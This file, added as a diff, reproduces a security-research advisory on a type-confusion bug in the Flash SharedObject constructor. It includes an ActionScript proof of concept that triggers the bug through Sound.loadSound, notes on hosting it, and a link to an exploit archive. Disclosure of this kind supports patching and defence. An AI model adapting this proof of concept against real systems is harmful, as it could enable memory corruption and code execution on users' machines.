@@ -1,0 +1,29 @@
+Source: https://code.google.com/p/google-security-research/issues/detail?id=434&can=1&q=label%3AProduct-Flash%20modified-after%3A2015%2F8%2F17&sort=id
+
+The Shared Object constructor does not check that the object it is provided is of type Object before setting it to be of type SharedObject. This can cause problems if another method (such as Sound.loadSound) calls into script between checking the input object type, and casting its native object. A PoC is as follows:
+
+class subso extends Sound{
+
+	public function subso(f){
+			
+	super("_level0.test");
+	var n = {valueOf : func};
+	_global.func = f;
+	_global.t = this;
+	var f2 = this.loadSound;
+	f2.call(this, n, 1);
+}
+
+function func(){
+	
+	_global.func(_global.t,"/sosuper.swf", "/sosuper.swf");
+	return 1;
+	}
+}
+	
+
+A sample fla, swf and AS file are attached. Note that this PoC needs to be hosted on a webserver to work and only works on 32-bit systems (tested on Windows Chrome). song1.mp3 should be put in the same folder on the server as the swf, it is needed for loadSound to work. This bug is likely only exploitable on 32-bit systems due to how the type-confused fields line up.
+
+Proof of Concept:
+https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/37881.zip
+
